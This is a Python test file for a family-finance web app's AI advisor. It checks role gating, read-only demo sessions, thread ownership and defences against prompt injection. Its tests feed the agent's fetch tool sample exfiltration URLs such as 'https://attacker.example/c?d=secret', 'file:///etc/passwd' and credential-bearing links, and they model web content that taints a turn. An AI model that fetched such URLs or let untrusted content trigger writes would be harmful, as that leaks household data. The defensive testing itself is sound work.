"""
One definition of "may change household data" (`routes.context.can_mutate`) and advisor tool safety:
role gating, /api/sync, demo/viewer advisor turns, exact-id LP deletes, per-turn prompt-injection taint,
and fetch_web_page exfiltration bounds.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest
from flask import session

from app import app
from routes.context import can_mutate, editor_required


def _client(role, *, is_demo=False, universe="public", family_id=1):
    client = app.test_client()
    with client.session_transaction() as sess:
        sess["authenticated"] = True
        sess["user_email"] = "member@example.com"
        sess["family_id"] = family_id
        sess["user_family_id"] = family_id
        sess["universe"] = universe
        sess["is_demo"] = is_demo
        if role is not None:
            sess["role"] = role
    return client


def _probe():
    return "ok", 200


_guarded = editor_required(_probe)


def _guarded_status(role, *, authenticated=True, is_demo=False, universe="public"):
    with app.test_request_context("/api/probe", method="POST"):
        if authenticated:
            session["authenticated"] = True
            session["user_email"] = "member@example.com"
            session["family_id"] = 1
            session["universe"] = universe
            session["is_demo"] = is_demo
            if role is not None:
                session["role"] = role
        result = _guarded()
        status = result[1] if isinstance(result, tuple) else result.status_code
        return status, can_mutate()


@pytest.mark.parametrize("role,is_demo", [("viewer", False), (None, False), ("editor", True), ("viewer", True)])
def test_editor_required_and_can_mutate_reject_viewer_missing_role_and_demo(role, is_demo):
    status, mutate = _guarded_status(role, is_demo=is_demo, universe="demo" if is_demo else "public")
    assert status == 403
    assert mutate is False


def test_editor_required_unauthenticated_is_401_and_editor_passes():
    status, mutate = _guarded_status(None, authenticated=False)
    assert status == 401 and mutate is False
    status, mutate = _guarded_status("editor")
    assert status == 200 and mutate is True


def test_stale_demo_flag_on_authentic_public_session_is_healed_by_the_single_predicate():
    status, mutate = _guarded_status("owner", is_demo=True)
    assert status == 200 and mutate is True


def test_api_sync_rejects_viewer_and_missing_role_and_runs_for_editor(monkeypatch):
    import routes.accounts as accounts

    calls = []
    monkeypatch.setattr(accounts, "_run_unified_account_sync", lambda family_id: calls.append(family_id) or {"success": True})
    for role in ("viewer", None):
        resp = _client(role).post("/api/sync", json={"sync": True})
        assert resp.status_code == 403
    assert calls == []
    demo = _client("viewer", is_demo=True, universe="demo").post("/api/sync", json={"sync": True})
    assert demo.status_code == 403
    assert app.test_client().post("/api/sync", json={}).status_code == 401
    assert _client("editor").post("/api/sync", json={"sync": True}).status_code == 200
    assert calls == [1]


class _ConversationLedger:
    """Stateful stand-in for db.conversations writes: records every attempted write."""

    def __init__(self):
        self.writes = []

    def create_conversation(self, **kwargs):
        self.writes.append(("create", kwargs))

    def add_message(self, **kwargs):
        self.writes.append(("message", kwargs))


def test_demo_advisor_turn_saves_no_conversation_rows(monkeypatch):
    import db

    ledger = _ConversationLedger()
    monkeypatch.setattr(db.conversations, "create_conversation", ledger.create_conversation)
    monkeypatch.setattr(db.conversations, "add_message", ledger.add_message)
    resp = _client("viewer", is_demo=True, universe="demo").post("/api/ai-advisor/chat", json={"message": "What is our allocation?"})
    assert resp.status_code == 200
    body = resp.get_json()
    assert body["demo_mode"] is True and body["conversation_id"]
    assert ledger.writes == []


def test_viewer_advisor_turn_has_no_write_tools(monkeypatch):
    from unittest.mock import MagicMock
    import routes.ai_advisor as ai_adv

    seen = {}

    def fake_generate(prompt, tools, **kwargs):
        seen["tools"] = [t.__name__ for t in tools]
        reply = MagicMock()
        reply.text = "Allocation is on target."
        return reply

    monkeypatch.setattr(ai_adv, "generate_content_with_tools", fake_generate)
    monkeypatch.setenv("GEMINI_API_KEY", "fake-test-key-12345")
    resp = _client("viewer").post("/api/ai-advisor/chat", json={"message": "What is my asset allocation target?", "active_tab": "section-holdings"})
    assert resp.status_code == 200
    assert not resp.get_json().get("demo_mode")
    assert "get_portfolio_allocation" in seen["tools"]
    for write_tool in ("manage_lp_commitment", "manage_scenario_life_event", "update_scenario_assumptions", "update_tax_document_checklist_status"):
        assert write_tool not in seen["tools"]

    seen.clear()
    assert _client("editor").post("/api/ai-advisor/chat", json={"message": "What is my asset allocation target?", "active_tab": "section-holdings"}).status_code == 200
    assert "manage_lp_commitment" in seen["tools"]


class _FundBook:
    """Stateful LP book double: deleting an unknown id raises, mirroring the repository contract."""

    def __init__(self):
        self.funds = {"lp_1": {"id": "lp_1", "fund_name": "Alpha Growth Fund I"}, "lp_2": {"id": "lp_2", "fund_name": "Alpha Growth Fund II"}}

    def get(self, family_id=0):
        return [dict(f) for f in self.funds.values()]

    def delete(self, family_id=0, item_id=None):
        if item_id not in self.funds:
            raise AssertionError(f"delete of unknown id {item_id}")
        del self.funds[item_id]
        return True


@pytest.fixture
def fund_book(monkeypatch):
    from services.advisor import tools_operations as ops

    book = _FundBook()
    monkeypatch.setattr(ops, "_resolve_tool_family_id", lambda family_id=0: 42)
    monkeypatch.setattr(ops, "_is_read_only_mode", lambda: False)
    monkeypatch.setattr(ops.pms, "get_lp_commitments", book.get)
    monkeypatch.setattr(ops.pms, "delete_lp_commitment", book.delete)
    monkeypatch.setattr(ops, "get_private_markets_lp_book", lambda family_id=0: {"summary": {}})
    return book


def test_lp_delete_by_substring_name_never_acts_and_lists_candidates(fund_book):
    from services.advisor.tools_operations import manage_lp_commitment

    res = manage_lp_commitment(action="delete", fund_name="Alpha Growth")
    assert res["status"] == "id_required"
    assert {c["id"] for c in res["candidates"]} == {"lp_1", "lp_2"}
    assert set(fund_book.funds) == {"lp_1", "lp_2"}
    res = manage_lp_commitment(action="delete", commitment_id="lp")
    assert res["status"] == "id_required" and set(fund_book.funds) == {"lp_1", "lp_2"}


def test_lp_delete_by_exact_id_deletes_only_that_fund(fund_book, monkeypatch):
    from services.advisor.tools_operations import manage_lp_commitment

    res = manage_lp_commitment(action="delete", commitment_id="lp_2", fund_name="Alpha Growth Fund I")
    assert res["status"] == "deleted" and res["commitment_id"] == "lp_2"
    assert set(fund_book.funds) == {"lp_1"}


def test_lp_update_by_existing_name_requires_exact_id(fund_book):
    from services.advisor.tools_operations import manage_lp_commitment

    res = manage_lp_commitment(action="upsert", fund_name="alpha growth fund i", current_nav=1.0)
    assert res["status"] == "id_required"


class _ToolSet:
    """Tool doubles (named like the real advisor tools) that record each call."""

    def __init__(self):
        self.calls = []

        def fetch_web_page(url: str = "") -> dict:
            self.calls.append("fetch_web_page")
            return {"success": True}

        def search_live_web(query: str = "") -> dict:
            self.calls.append("search_live_web")
            return {"success": True}

        def manage_lp_commitment(action: str = "upsert") -> dict:
            self.calls.append("manage_lp_commitment")
            return {"status": "saved"}

        def get_portfolio_allocation(family_id: int = 0) -> dict:
            self.calls.append("get_portfolio_allocation")
            return {}

        self.tools = [get_portfolio_allocation, search_live_web, fetch_web_page, manage_lp_commitment]

    def by_name(self, bound):
        return {t.__name__: t for t in bound}


@pytest.mark.parametrize("untrusted", ["fetch_web_page", "search_live_web"])
def test_write_tool_refuses_after_untrusted_content_in_same_turn_only(household_context, untrusted):
    from services.advisor.tool_permissions import AdvisorTurn

    doubles = _ToolSet()
    with household_context(1):
        tainted_turn = AdvisorTurn().authorize(doubles.tools)
        names = doubles.by_name(tainted_turn)
        assert names["manage_lp_commitment"]()["status"] == "saved"
        names[untrusted]()
        refused = names["manage_lp_commitment"]()
        assert refused["status"] == "refused_untrusted_context"
        assert "confirm" in refused["error"].lower() and "next message" in refused["error"].lower()
        assert names["get_portfolio_allocation"]() == {}
        assert doubles.calls.count("manage_lp_commitment") == 1

        fresh = doubles.by_name(AdvisorTurn().authorize(doubles.tools))
        assert fresh["manage_lp_commitment"]()["status"] == "saved"
        assert doubles.calls.count("manage_lp_commitment") == 2


def test_real_advisor_tools_classify_exactly_the_four_write_tools():
    from services.advisor.tool_permissions import write_tool_names
    from services.advisor.tools_tabs import ALL_ADVISOR_TOOLS

    assert write_tool_names(ALL_ADVISOR_TOOLS) == {
        "manage_scenario_life_event", "update_scenario_assumptions",
        "manage_lp_commitment", "update_tax_document_checklist_status",
    }


def test_read_only_caller_is_not_offered_write_tools(household_context):
    from services.advisor.tool_permissions import AdvisorTurn

    doubles = _ToolSet()
    with household_context(1, can_mutate=False):
        offered = {t.__name__ for t in AdvisorTurn().authorize(doubles.tools)}
    assert offered == {"get_portfolio_allocation", "search_live_web", "fetch_web_page"}


@pytest.mark.parametrize("url", [
    "https://example.com/p?data=" + "a" * 200,
    "https://example.com/p#" + "b" * 200,
    "ftp://example.com/file",
    "file:///etc/passwd",
    "javascript:alert(1)",
    "example.com/no-scheme",
])
def test_fetch_web_page_refuses_exfiltrating_or_non_http_urls(monkeypatch, url):
    import hvl_common.ai.gemini as gemini
    from services.advisor import tools_operations as ops

    def must_not_fetch(**_kwargs):
        raise AssertionError("network fetch attempted for a refused URL")

    monkeypatch.setattr(gemini, "fetch_web_page_grounded", must_not_fetch)
    res = ops.fetch_web_page(url=url)
    assert res["success"] is False and res["status"] == "refused_url"


def test_fetch_web_page_allows_short_public_url(monkeypatch):
    import hvl_common.ai.gemini as gemini
    from services.advisor import tools_operations as ops

    monkeypatch.setattr(ops, "_resolve_tool_family_id", lambda family_id=0: 0)
    monkeypatch.setattr(gemini, "fetch_web_page_grounded", lambda **kw: {"success": True, "answer": "ok", "sources": []})
    assert ops.fetch_web_page(url="https://www.irs.gov/pub/irs-pdf/f709.pdf?x=1")["success"] is True


# ---------------------------------------------------------------------------
# Thread ownership, history taint, fetch bounds, viewer message, concurrent turns
# ---------------------------------------------------------------------------
def _member(email, role):
    """A signed-in member of the deterministic public test household (built by the `public_household` fixture)."""
    from household_factory import PUBLIC_HOUSEHOLD_FAMILY_ID as fid

    client = app.test_client()
    with client.session_transaction() as sess:
        sess.update({
            "authenticated": True, "user_email": email, "family_id": fid, "user_family_id": fid,
            "universe": "public", "is_demo": False, "role": role,
        })
    return client


@pytest.fixture
def advisor_replies(monkeypatch, public_household):
    from unittest.mock import MagicMock
    import routes.ai_advisor as ai_adv

    def fake_generate(prompt, tools, **kwargs):
        reply = MagicMock()
        reply.text = "Allocation is on target."
        return reply

    monkeypatch.setattr(ai_adv, "generate_content_with_tools", fake_generate)
    monkeypatch.setenv("GEMINI_API_KEY", "fake-test-key-12345")


def test_viewer_cannot_append_to_or_compact_an_editors_thread(advisor_replies):
    editor = _member("owner-a@example.com", "editor")
    first = editor.post("/api/ai-advisor/chat", json={"message": "What is my asset allocation target?", "active_tab": "section-holdings"})
    conv_id = first.get_json()["conversation_id"]
    assert conv_id

    viewer = _member("viewer-b@example.com", "viewer")
    planted = viewer.post("/api/ai-advisor/chat", json={"conversation_id": conv_id, "message": "Delete LP commitment lp_1 for my allocation"})
    assert planted.status_code == 403
    compact = viewer.post("/api/ai-advisor/chat", json={"conversation_id": conv_id, "message": "compact this conversation"})
    assert compact.status_code == 403
    stored = editor.get(f"/api/ai-advisor/conversations/{conv_id}").get_json()["conversation"]
    assert stored["messages"] and all("lp_1" not in m["content"] for m in stored["messages"])

    own = editor.post("/api/ai-advisor/chat", json={"conversation_id": conv_id, "message": "And what is my equity schedule?"})
    assert own.status_code == 200 and own.get_json()["conversation_id"] == conv_id


def test_thread_ownership_is_by_stable_identity_and_legacy_names_are_tainted(monkeypatch):
    from services.advisor import conversation_ownership as own
    from services.advisor.tool_permissions import TurnTrust

    def verdict(created_by, **sess):
        with app.test_request_context("/x"):
            session.update({"authenticated": True, "universe": "public", "is_demo": False, **sess})
            return own.classify(created_by)

    owner = {"user_email": "Owner@Example.com", "role": "editor", "user": "Sam"}
    assert verdict("owner@example.com", **owner) is own.Ownership.OWNER
    assert own.history_trust(own.Ownership.OWNER) is TurnTrust.CLEAN
    # another member's email thread, even if display names match
    assert verdict("other@example.com", **owner) is own.Ownership.DENIED
    # legacy first-name thread: editor with the same display name is allowed but tainted
    assert verdict("Sam", **owner) is own.Ownership.LEGACY_EDITOR
    assert own.history_trust(own.Ownership.LEGACY_EDITOR) is TurnTrust.TAINTED
    # a viewer who picked the same display name is denied
    viewer = {"user_email": "viewer@example.com", "role": "viewer", "user": "Sam"}
    assert verdict("Sam", **viewer) is own.Ownership.DENIED
    assert verdict("Family Member", **viewer) is own.Ownership.DENIED
    # no stable identity at all: denied, never a shared fallback
    assert verdict("Family Member", role="editor", user="Family Member") is own.Ownership.DENIED
    # desktop: no email, stable user id
    desktop = {"user_id": 9, "role": "admin", "user": "Sam", "user_email": ""}
    assert verdict("user:9", **desktop) is own.Ownership.OWNER
    assert verdict("user:10", **desktop) is own.Ownership.DENIED


def test_session_without_identity_cannot_use_the_advisor(advisor_replies):
    client = app.test_client()
    with client.session_transaction() as sess:
        sess.update({"authenticated": True, "user": "Sam", "family_id": 1, "user_family_id": 1, "universe": "public", "role": "editor", "is_demo": False})
    assert client.post("/api/ai-advisor/chat", json={"message": "What is my allocation target?"}).status_code == 403
    assert client.post("/api/ai-advisor/conversations", json={"title": "x"}).status_code == 403


def test_carryover_thread_is_owned_by_the_caller_and_can_be_continued(advisor_replies):
    editor = _member("carry@example.com", "editor")
    first = editor.post("/api/ai-advisor/chat", json={"message": "What is my asset allocation target?"}).get_json()
    carried = editor.post("/api/ai-advisor/chat", json={"conversation_id": first["conversation_id"], "message": "start a new conversation"}).get_json()
    new_id = carried["conversation_id"]
    assert carried["is_new_conversation"] and new_id != first["conversation_id"]
    cont = editor.post("/api/ai-advisor/chat", json={"conversation_id": new_id, "message": "What is my equity schedule?"})
    assert cont.status_code == 200
    other = _member("other-editor@example.com", "editor")
    assert other.post("/api/ai-advisor/chat", json={"conversation_id": new_id, "message": "What is my equity schedule?"}).status_code == 403
    for cid in (new_id, first["conversation_id"]):
        editor.delete(f"/api/ai-advisor/conversations/{cid}")


def test_rename_delete_and_bulk_delete_respect_thread_ownership(advisor_replies):
    owner = _member("own-a@example.com", "editor")
    conv_id = owner.post("/api/ai-advisor/conversations", json={"title": "Mine"}).get_json()["conversation_id"]
    mine_too = owner.post("/api/ai-advisor/conversations", json={"title": "Mine too"}).get_json()["conversation_id"]
    intruder = _member("own-b@example.com", "editor")
    assert intruder.put(f"/api/ai-advisor/conversations/{conv_id}", json={"title": "pwned"}).status_code == 403
    assert intruder.delete(f"/api/ai-advisor/conversations/{conv_id}").status_code == 403
    assert intruder.post("/api/ai-advisor/conversations/bulk-delete", json={"conversation_ids": [conv_id, mine_too]}).get_json()["deleted_count"] == 0
    assert owner.get(f"/api/ai-advisor/conversations/{conv_id}").get_json()["conversation"]["title"] == "Mine"
    assert owner.put(f"/api/ai-advisor/conversations/{conv_id}", json={"title": "Renamed"}).status_code == 200
    assert owner.post("/api/ai-advisor/conversations/bulk-delete", json={"conversation_ids": [conv_id, mine_too]}).get_json()["deleted_count"] == 2


def test_conversation_cap_counts_per_creator(monkeypatch, public_household):
    import config

    monkeypatch.setattr(config, "MAX_ADVISOR_CONVERSATIONS", 1)
    a, b = _member("cap-a@example.com", "editor"), _member("cap-b@example.com", "editor")
    first = a.post("/api/ai-advisor/conversations", json={"title": "A1"})
    assert first.status_code == 200
    assert a.post("/api/ai-advisor/conversations", json={"title": "A2"}).status_code == 400
    second = b.post("/api/ai-advisor/conversations", json={"title": "B1"})
    assert second.status_code == 200
    a.delete(f"/api/ai-advisor/conversations/{first.get_json()['conversation_id']}")
    b.delete(f"/api/ai-advisor/conversations/{second.get_json()['conversation_id']}")


def test_search_result_echoing_an_attacker_url_does_not_unlock_a_tainted_fetch(household_context):
    from services.advisor.tool_permissions import AdvisorTurn, TurnTrust

    attacker = "https://attacker.example/c?d=secret"
    fetched = []

    def search_live_web(query: str = "") -> dict:
        return {"success": True, "query": query, "answer": f"You asked about {query}", "sources": [{"url": "https://www.irs.gov/forms"}]}

    def fetch_web_page(url: str = "") -> dict:
        fetched.append(url)
        return {"success": True, "url": url, "answer": "page", "sources": []}

    with household_context(1):
        t = {x.__name__: x for x in AdvisorTurn(TurnTrust.TAINTED).authorize([search_live_web, fetch_web_page])}
        t["search_live_web"](query=attacker)
        assert t["fetch_web_page"](url=attacker)["status"] == "refused_tainted_fetch"
        assert t["fetch_web_page"](url="https://www.irs.gov/forms")["success"] is True
    assert fetched == ["https://www.irs.gov/forms"]


def test_tainted_turn_refuses_write_tools_from_its_first_call(household_context):
    from services.advisor.tool_permissions import AdvisorTurn, TurnTrust

    doubles = _ToolSet()
    with household_context(1):
        names = doubles.by_name(AdvisorTurn(TurnTrust.TAINTED).authorize(doubles.tools))
        assert names["manage_lp_commitment"]()["status"] == "refused_untrusted_context"
    assert "manage_lp_commitment" not in doubles.calls


class _FetchTools:
    """fetch_web_page / search_live_web doubles; search results mention a URL verbatim."""

    def __init__(self):
        self.fetched = []

        def fetch_web_page(url: str = "") -> dict:
            self.fetched.append(url)
            return {"success": True, "answer": "page"}

        def search_live_web(query: str = "") -> dict:
            return {"success": True, "sources": [{"url": "https://www.irs.gov/forms"}], "answer": "see https://www.irs.gov/pub/f709.pdf."}

        self.tools = [search_live_web, fetch_web_page]


def test_tainted_fetch_allowed_only_for_urls_seen_in_earlier_tool_results(household_context):
    from services.advisor.tool_permissions import AdvisorTurn, TurnTrust

    doubles = _FetchTools()
    with household_context(1):
        t = {x.__name__: x for x in AdvisorTurn(TurnTrust.TAINTED).authorize(doubles.tools)}
        assert t["fetch_web_page"](url="https://evil.example/x")["status"] == "refused_tainted_fetch"
        t["search_live_web"](query="form 709")
        assert t["fetch_web_page"](url="https://evil.example/x")["status"] == "refused_tainted_fetch"
        assert t["fetch_web_page"](url="https://www.irs.gov/forms")["success"] is True
        assert t["fetch_web_page"](url="https://www.irs.gov/pub/f709.pdf")["success"] is True
    assert doubles.fetched == ["https://www.irs.gov/forms", "https://www.irs.gov/pub/f709.pdf"]


def test_fetch_count_is_capped_per_turn(household_context):
    from services.advisor.tool_permissions import MAX_FETCHES_PER_TURN, AdvisorTurn

    doubles = _FetchTools()
    with household_context(1):
        turn = AdvisorTurn()
        t = {x.__name__: x for x in turn.authorize(doubles.tools)}
        turn_urls = [f"https://www.irs.gov/p{i}" for i in range(MAX_FETCHES_PER_TURN + 1)]
        turn.seen_urls.update(turn_urls)
        results = [t["fetch_web_page"](url=u)["success"] for u in turn_urls[:MAX_FETCHES_PER_TURN]]
        assert all(results)
        capped = t["fetch_web_page"](url=turn_urls[-1])
        assert capped["status"] == "refused_fetch_limit"
        fresh = {x.__name__: x for x in AdvisorTurn().authorize(doubles.tools)}
        assert fresh["fetch_web_page"](url="https://www.irs.gov/extra")["success"] is True


@pytest.mark.parametrize("url", [
    "https://example.com/" + "p" * 250,
    "https://" + "a" * 60 + ".example.com/",
    "https://" + ".".join(["abcdefghij"] * 12) + ".com/",
    "https://user:secret@example.com/",
])
def test_fetch_web_page_refuses_long_path_hostname_and_credentials(monkeypatch, url):
    import hvl_common.ai.gemini as gemini
    from services.advisor import tools_operations as ops

    monkeypatch.setattr(gemini, "fetch_web_page_grounded", lambda **kw: (_ for _ in ()).throw(AssertionError("fetched")))
    assert ops.fetch_web_page(url=url)["status"] == "refused_url"


def test_viewer_gets_editor_message_and_demo_gets_demo_message():
    viewer = _client("viewer").post("/api/sync", json={})
    assert "Editor permissions required" in viewer.get_json()["error"]
    demo = _client("viewer", is_demo=True, universe="demo").post("/api/sync", json={})
    assert "Demo personas are read-only" in demo.get_json()["error"]


def test_concurrent_turns_do_not_share_taint(household_context):
    import threading
    from services.advisor.tool_permissions import AdvisorTurn, TurnTrust

    tainted_ready, write_done = threading.Event(), threading.Event()
    outcomes = {}

    def tainted_turn():
        doubles = _ToolSet()
        with household_context(1):
            t = doubles.by_name(AdvisorTurn().authorize(doubles.tools))
            t["fetch_web_page"]()
            tainted_ready.set()
            assert write_done.wait(5)
            outcomes["tainted"] = t["manage_lp_commitment"]()["status"]

    def clean_turn():
        doubles = _ToolSet()
        assert tainted_ready.wait(5)
        with household_context(1):
            t = doubles.by_name(AdvisorTurn().authorize(doubles.tools))
            outcomes["clean"] = t["manage_lp_commitment"]()["status"]
        write_done.set()

    threads = [threading.Thread(target=tainted_turn), threading.Thread(target=clean_turn)]
    for th in threads:
        th.start()
    for th in threads:
        th.join(10)
    assert outcomes == {"tainted": "refused_untrusted_context", "clean": "saved"}


def test_public_session_without_login_marker_resolves_to_family_zero():
    from routes.context import get_current_family_id

    with app.test_request_context("/api/x"):
        session.update({"authenticated": True, "family_id": 1, "universe": "public", "is_demo": False, "role": "editor"})
        assert get_current_family_id() == 0
    with app.test_request_context("/api/x"):
        session.update({"authenticated": True, "family_id": 1, "user_family_id": 0, "universe": "public", "is_demo": False})
        assert get_current_family_id() == 0
    with app.test_request_context("/api/x"):
        session.update({"authenticated": True, "family_id": 1, "user_family_id": 7, "user_email": "m@example.com", "universe": "public"})
        assert get_current_family_id() == 7
